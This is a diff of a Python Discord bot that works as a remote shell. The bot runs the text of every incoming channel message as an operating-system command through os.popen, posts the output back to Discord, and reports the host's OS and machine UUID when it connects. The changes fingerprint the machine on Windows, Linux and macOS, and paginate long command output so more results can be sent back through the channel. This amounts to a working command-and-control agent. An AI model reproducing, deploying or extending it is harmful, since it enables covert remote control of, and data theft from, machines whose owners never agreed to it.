@@ -12,6 +12,7 @@ bot = commands.Bot(command_prefix=".")
 
 channel = None
 
+
 @bot.event
 async def on_ready():
     # Get server name
@@ -87,9 +88,14 @@ async def next_channel(channels):
 # Get the machine info
 async def machine_info():
     if platform.system() == "Windows":
-        machine_UUID = str(subprocess.check_output("wmic csproduct get UUID"))
+        get_UUID = str(subprocess.check_output("wmic csproduct get UUID").decode().strip())
+        for line in get_UUID:
+            UUID = " ".join(get_UUID.split())
+            machine_UUID = UUID[5:]
+    
     elif platform.system() == "Linux":
         machine_UUID = str(subprocess.check_output(["cat", "/etc/machine-id"]).decode().strip())
+    
     elif platform.system() == "Darwin":
         machine_UUID = str(subprocess.check_output(["ioreg",
                                                     "-d2",
@@ -99,15 +105,16 @@ async def machine_info():
                                                     "awk",
                                                     "-F",
                                                     "'/IOPlatformUUID/{print $(NF-1)}'"
-                                                   ])
+                                                    ])
                            )
+    
     else:
         machine_UUID = str("Unknown")
 
     message = discord.Embed(title="Machine Info", type="rich")
     message.add_field(name="Operating System", value=platform.system())
     message.add_field(name="UUID", value=machine_UUID)
-    
+
     # Non-embed alternative
     # message = f"`{platform.system()}` with the `{machine_UUID}` UUID connected."
 
@@ -118,6 +125,7 @@ async def machine_info():
 async def on_message(message):
     if message.author.id == bot.user.id:
         return
+    
     else:
         await shell_input(channel, message)
 
@@ -191,15 +199,25 @@ async def shell_input(channel, message):
             try:
                 # Try to read the user's input
                 user_input = os.popen(message.content).read()
-            
+
             except:
                 print("OS POPEN exception!")
-            
+
             if user_input == "":
                 await message.channel.send("The command did not return anything")
+            
             else:
-                await message.channel.send(f"```{user_input}```")
-    
+                paginator = discord.ext.commands.Paginator(prefix="```", suffix="```")
+
+                n = 1992
+                user_input_splitted = [user_input[i:i + n] for i in range(0, len(user_input), n)]
+
+                for page in user_input_splitted:
+                    paginator.add_line(page)
+
+                for page in paginator.pages:
+                    await message.channel.send(f"{page}")
+
     else:
         return
 
